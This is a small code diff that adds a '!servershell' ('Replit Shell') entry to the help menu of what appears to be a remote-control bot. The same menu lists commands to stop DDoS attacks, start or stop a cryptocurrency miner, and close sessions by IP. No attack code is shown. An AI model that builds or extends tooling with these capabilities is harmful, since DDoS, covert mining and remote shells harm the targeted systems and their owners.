@@ -20,6 +20,7 @@ helpmenu = """
 > !stopddos # Stops DDOS Attack
 > !miner    # Start miner   # Settings on Github
 > !stopminer    # Stop miner
+> !servershell  # Replit Shell
 
 ** Self Commands **
 > !kill.<ip>    # Close session
